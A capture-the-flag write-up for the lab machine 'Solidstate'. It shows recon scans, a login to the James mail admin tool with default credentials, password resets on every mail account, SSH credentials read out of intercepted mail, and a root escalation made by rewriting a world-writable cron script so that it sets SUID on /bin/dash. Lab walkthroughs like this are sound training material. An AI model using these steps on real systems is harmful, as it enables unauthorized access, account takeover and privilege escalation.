Solidstate Writeup

# Recon

`nmap` scans show that Ports 22,25,80,110,119,4555 are open.

```
root@kali# nmap -sC -sV -v -p- 10.10.10.51
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey:
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.17 [10.10.14.17]),
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
```

`nmap smtp-enum-users` scan returns `root` as a user.

```
nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.10.10.51
PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.17 [10.10.14.17]),
| smtp-enum-users:
|_  root
| smtp-vuln-cve2010-4344:
|_  The SMTP server is not Exim: NOT VULNERABLE
```


Port 80 - HTTP
The website belongs to Solid State Security. 

![image](https://user-images.githubusercontent.com/58801175/110847059-50903a00-8261-11eb-9762-a9de5cfca573.png)

There is a form on the front page with name, email, message fields. When submitted, the POST request is sent to `/`. I don't believe there is anything to be explored here.

![image](https://user-images.githubusercontent.com/58801175/110847102-5b4acf00-8261-11eb-8b3e-934d4b72bc02.png)


Using `gobuster` to bruteforce web directories.
```
root@kali# gobuster dir -u http://10.10.10.51/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 

/index.html (Status: 200)
/images (Status: 301)
/about.html (Status: 200)
/services.html (Status: 200)
/assets (Status: 301)
```

I didn't find anything interesting, so I'll move on to exploring a different service.


Port 4555,119,110,25 - James Mail Server

The `nmap SMTP scan` shows that `root` is a valid user. I'll try default credentials for James Remote Admin Tool on Port 4555.

Connecting to James Mail Server via `netcat` using `root:root`.
```
nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

List commands
```
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit  
```

Getting users via `listusers`
```
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

Set the password for all of the accounts listed via `setpassword`
```
setpassword james r00t3d
setpassword thomas r00t3d
setpassword john r00t3d
setpassword mindy r00t3d
setpassword mailadmin r00t3d
```

Now, I'll try use `telnet` to connect to POP3 to check the mails for each user.

```
root@kali# telnet 10.10.10.51 110
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER john
+OK
PASS r00t3d
+OK Welcome john
LIST
+OK 1 743
1 743
```

Use `RETR` to read the mail

```
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
```

Looks like someone is going to email mindy a temporary password. I'll take a look at mindy's mail to see if that's the case.

```
root@kali# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS r00t3d
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
```

Mail #1
```
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
```

Mail #2
```
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

Now we have mindy's SSH credentials.
```
username: mindy
pass: P@55W0rd1!2@
```

# Low Priv Shell

Connecting to SSH with mindy's credentials
```
root@kali# ssh mindy@10.10.10.51 -t bash
```

Using linpeas.sh, there are some interesting writable files returned. 
```
[+] Interesting writable files owned by me or writable by everyone (not in Home)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/mqueue/linpeas.txt
/dev/shm
/home/mindy
/opt/tmp.py
/run/lock
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/run/user/1001/systemd/transient
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/var/tmp
```

`/opt/tmp.py` sparked my interest, so I'll look at that first.

Checking who owns `tmp.py`
```
${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ ls -l /opt/
total 8
drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
```

Inspecting `/opt/tmp.py` contents using `vi`
```
#!/usr/bin/env python
import os
import sys
try:
	
	os.system('touch /tmp/rrrr')
except:
	sys.exit()
```
# Escalating Privileges
Looking at /tmp/ I saw there was a file created named `rrrr` which is owned by root, which makes me believe `/opt/tmp.py` is being ran by a hidden cronjob.

Since I have write permissions and `/opt/tmp.py` is owned by root, I will edit the script and set the SUID bit on `/bin/dash` to spawn a root shell.
```
#!/usr/bin/env python
import os
import sys
try:
	
	os.system('chmod +u+s /bin/dash')
except:
	sys.exit()
```

Getting root

![image](https://user-images.githubusercontent.com/58801175/110847148-6aca1800-8261-11eb-93d8-62c3ea91c1df.png)

